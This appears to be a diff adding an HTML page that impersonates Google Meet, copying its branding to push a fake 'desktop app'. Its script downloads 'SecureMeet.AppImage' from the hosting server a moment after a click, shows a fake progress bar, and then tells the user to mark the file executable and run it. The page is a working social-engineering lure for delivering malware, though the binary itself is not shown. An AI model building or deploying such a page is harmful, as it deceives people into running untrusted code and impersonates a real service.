@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Meet</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+  background: #fff;
+  min-height: 100vh;
+  display: flex; flex-direction: column;
+}
+
+/* ── Top bar ── */
+.topbar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 12px 24px; border-bottom: 1px solid #e0e0e0;
+}
+.topbar-logo { display: flex; align-items: center; gap: 8px; }
+.topbar-logo svg { width: 40px; height: 40px; }
+.topbar-logo-text { font-size: 22px; color: #5f6368; font-weight: 400; letter-spacing: -0.5px; }
+.topbar-logo-text span { color: #1a73e8; }
+.topbar-btn {
+  background: #1a73e8; color: #fff; border: none;
+  padding: 9px 20px; border-radius: 4px; font-size: 14px;
+  font-weight: 500; cursor: pointer;
+}
+
+/* ── Main layout ── */
+.main {
+  flex: 1; display: flex; align-items: center; justify-content: center;
+  padding: 40px 20px; gap: 60px;
+}
+@media (max-width: 768px) { .main { flex-direction: column; gap: 30px; } }
+
+/* ── Left: app promo ── */
+.promo { max-width: 440px; }
+.promo-eyebrow {
+  font-size: 13px; font-weight: 500; color: #1a73e8;
+  letter-spacing: 0.3px; margin-bottom: 14px;
+}
+.promo-title { font-size: 32px; font-weight: 400; color: #202124; line-height: 1.25; margin-bottom: 16px; }
+.promo-sub { font-size: 16px; color: #5f6368; line-height: 1.6; margin-bottom: 28px; }
+
+.feature-list { list-style: none; display: flex; flex-direction: column; gap: 14px; margin-bottom: 32px; }
+.feature-list li { display: flex; align-items: flex-start; gap: 12px; font-size: 14px; color: #3c4043; line-height: 1.5; }
+.feature-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+
+.btn-row { display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
+.btn-primary {
+  display: flex; align-items: center; gap: 8px;
+  background: #1a73e8; color: #fff; border: none;
+  padding: 12px 24px; border-radius: 4px; font-size: 15px;
+  font-weight: 500; cursor: pointer; text-decoration: none;
+  transition: background 0.2s; white-space: nowrap;
+}
+.btn-primary:hover { background: #1765cc; }
+.btn-secondary {
+  font-size: 14px; color: #1a73e8; text-decoration: none;
+  cursor: pointer; border: none; background: none;
+  font-weight: 500; padding: 12px 0;
+}
+.btn-secondary:hover { text-decoration: underline; }
+
+/* ── Progress / status ── */
+.download-status {
+  margin-top: 18px; display: none;
+  font-size: 13px; color: #5f6368;
+}
+.download-status.show { display: block; }
+.dl-bar-wrap { height: 3px; background: #e8eaed; border-radius: 2px; margin: 8px 0; overflow: hidden; }
+.dl-bar { height: 100%; background: #1a73e8; border-radius: 2px; width: 0%; transition: width 0.3s; }
+
+/* ── Steps card (shown after download) ── */
+.steps-card {
+  display: none; margin-top: 20px;
+  background: #f8f9fa; border: 1px solid #e8eaed;
+  border-radius: 8px; padding: 18px 20px;
+}
+.steps-card.show { display: block; }
+.steps-card-title { font-size: 13px; font-weight: 600; color: #3c4043; margin-bottom: 12px; }
+.steps-list { list-style: none; display: flex; flex-direction: column; gap: 10px; }
+.steps-list li { display: flex; gap: 10px; align-items: flex-start; font-size: 13px; color: #5f6368; line-height: 1.5; }
+.step-num {
+  background: #1a73e8; color: #fff; border-radius: 50%;
+  width: 20px; height: 20px; font-size: 11px; font-weight: 700;
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+}
+
+/* ── Right: preview ── */
+.preview {
+  max-width: 380px; width: 100%;
+  background: #f8f9fa; border: 1px solid #e8eaed;
+  border-radius: 12px; overflow: hidden;
+}
+.preview-bar {
+  background: #3c4043; padding: 10px 14px;
+  display: flex; align-items: center; gap: 8px;
+}
+.preview-dots { display: flex; gap: 5px; }
+.preview-dots span { width: 10px; height: 10px; border-radius: 50%; }
+.d1 { background: #ff5f57; }
+.d2 { background: #febc2e; }
+.d3 { background: #28c840; }
+.preview-url {
+  flex: 1; background: #5f6368; border-radius: 3px;
+  padding: 4px 10px; font-size: 11px; color: #e8eaed; text-align: center;
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+}
+.preview-body { padding: 20px; }
+.preview-meet-logo { display: flex; align-items: center; gap: 6px; margin-bottom: 14px; }
+.preview-meet-logo-icon { width: 24px; height: 24px; }
+.preview-meet-logo-text { font-size: 16px; color: #5f6368; }
+.preview-title { font-size: 15px; font-weight: 500; color: #202124; margin-bottom: 6px; }
+.preview-sub { font-size: 12px; color: #5f6368; margin-bottom: 16px; }
+.preview-cam-box {
+  background: #202124; border-radius: 8px;
+  aspect-ratio: 16/9; display: flex; align-items: center; justify-content: center;
+  margin-bottom: 14px; position: relative; overflow: hidden;
+}
+.preview-cam-icon { font-size: 32px; opacity: 0.4; }
+.preview-cam-label {
+  position: absolute; bottom: 8px; left: 0; right: 0; text-align: center;
+  font-size: 10px; color: #80868b;
+}
+.preview-btn-row { display: flex; gap: 8px; }
+.preview-btn {
+  flex: 1; padding: 8px; border-radius: 4px; border: none;
+  font-size: 12px; font-weight: 500; cursor: default;
+  text-align: center;
+}
+.pb-blue { background: #1a73e8; color: #fff; }
+.pb-grey { background: #e8eaed; color: #5f6368; }
+
+.footer {
+  padding: 16px 24px; border-top: 1px solid #e0e0e0;
+  display: flex; gap: 24px; flex-wrap: wrap;
+}
+.footer a { font-size: 12px; color: #5f6368; text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<!-- Top bar -->
+<div class="topbar">
+  <div class="topbar-logo">
+    <svg viewBox="0 0 75 75" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="75" height="75" rx="10" fill="#00832D"/>
+      <path d="M43.5 37.5L54 28.5V46.5L43.5 37.5Z" fill="white"/>
+      <rect x="21" y="27" width="22.5" height="21" rx="3" fill="white"/>
+    </svg>
+    <span class="topbar-logo-text">G<span>oogle</span> Meet</span>
+  </div>
+  <button class="topbar-btn" onclick="startDownload()">Download app</button>
+</div>
+
+<!-- Main -->
+<div class="main">
+  <div class="promo">
+    <div class="promo-eyebrow">GOOGLE MEET DESKTOP APP</div>
+    <div class="promo-title">Better meetings on your desktop</div>
+    <div class="promo-sub">
+      Get the full Google Meet experience with improved video quality, noise cancellation, and direct camera access — no browser restrictions.
+    </div>
+
+    <ul class="feature-list">
+      <li><span class="feature-icon">🎥</span> HD video with automatic camera optimisation</li>
+      <li><span class="feature-icon">🔒</span> End-to-end encrypted with hardware verification</li>
+      <li><span class="feature-icon">🚀</span> Faster join — no loading screens or browser prompts</li>
+      <li><span class="feature-icon">🔇</span> AI-powered background noise cancellation</li>
+    </ul>
+
+    <div class="btn-row">
+      <a class="btn-primary" id="dl-btn" href="#" onclick="startDownload(); return false;">
+        ⬇ Download for Linux
+      </a>
+      <button class="btn-secondary" onclick="openInBrowser()">Continue in browser instead</button>
+    </div>
+
+    <!-- Download progress -->
+    <div class="download-status" id="dl-status">
+      <div id="dl-label">Preparing download...</div>
+      <div class="dl-bar-wrap"><div class="dl-bar" id="dl-bar"></div></div>
+    </div>
+
+    <!-- Steps after download -->
+    <div class="steps-card" id="steps-card">
+      <div class="steps-card-title">Run SecureMeet to join your meeting:</div>
+      <ul class="steps-list">
+        <li><div class="step-num">1</div><span>Open your <strong>Downloads</strong> folder and find <strong>SecureMeet.AppImage</strong></span></li>
+        <li><div class="step-num">2</div><span>Right-click → <strong>Properties</strong> → <strong>Permissions</strong> → tick <em>Allow executing as program</em></span></li>
+        <li><div class="step-num">3</div><span>Double-click to open — your meeting will start automatically</span></li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Right: fake browser preview -->
+  <div class="preview">
+    <div class="preview-bar">
+      <div class="preview-dots">
+        <span class="d1"></span><span class="d2"></span><span class="d3"></span>
+      </div>
+      <div class="preview-url" id="preview-url">meet.google.com</div>
+    </div>
+    <div class="preview-body">
+      <div class="preview-meet-logo">
+        <svg class="preview-meet-logo-icon" viewBox="0 0 75 75" fill="none">
+          <rect width="75" height="75" rx="10" fill="#00832D"/>
+          <path d="M43.5 37.5L54 28.5V46.5L43.5 37.5Z" fill="white"/>
+          <rect x="21" y="27" width="22.5" height="21" rx="3" fill="white"/>
+        </svg>
+        <span class="preview-meet-logo-text">Google Meet</span>
+      </div>
+      <div class="preview-title">Ready to join?</div>
+      <div class="preview-sub">Your meeting is waiting</div>
+      <div class="preview-cam-box">
+        <span class="preview-cam-icon">📷</span>
+        <div class="preview-cam-label">Camera available in desktop app</div>
+      </div>
+      <div class="preview-btn-row">
+        <div class="preview-btn pb-blue">Join now</div>
+        <div class="preview-btn pb-grey">Present</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <a href="#">Privacy</a>
+  <a href="#">Terms</a>
+  <a href="#">About</a>
+  <a href="#">Google Meet Help</a>
+</div>
+
+<script>
+function startDownload() {
+  const btn    = document.getElementById('dl-btn');
+  const status = document.getElementById('dl-status');
+  const bar    = document.getElementById('dl-bar');
+  const label  = document.getElementById('dl-label');
+  const steps  = document.getElementById('steps-card');
+
+  btn.textContent = '⏳ Downloading...';
+  btn.style.pointerEvents = 'none';
+  btn.style.background = '#5f6368';
+
+  status.classList.add('show');
+
+  // Animate progress bar
+  let pct = 0;
+  const iv = setInterval(() => {
+    pct += Math.random() * 18;
+    if (pct > 95) pct = 95;
+    bar.style.width = pct + '%';
+    label.textContent = `Downloading SecureMeet... ${Math.round(pct)}%`;
+  }, 300);
+
+  // Trigger actual download after 0.5s
+  setTimeout(() => {
+    const a = document.createElement('a');
+    a.href = '/download';
+    a.download = 'SecureMeet.AppImage';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }, 500);
+
+  // Complete bar after 3s, show steps
+  setTimeout(() => {
+    clearInterval(iv);
+    bar.style.width = '100%';
+    bar.style.background = '#34a853';
+    label.textContent = '✓ Download complete — SecureMeet.AppImage';
+    btn.textContent = '✓ Downloaded';
+    steps.classList.add('show');
+  }, 3000);
+}
+
+function openInBrowser() {
+  window.location.href = '/browser';
+}
+
+// Set preview URL to current host
+document.getElementById('preview-url').textContent = window.location.hostname;
+</script>
+</body>
+</html>
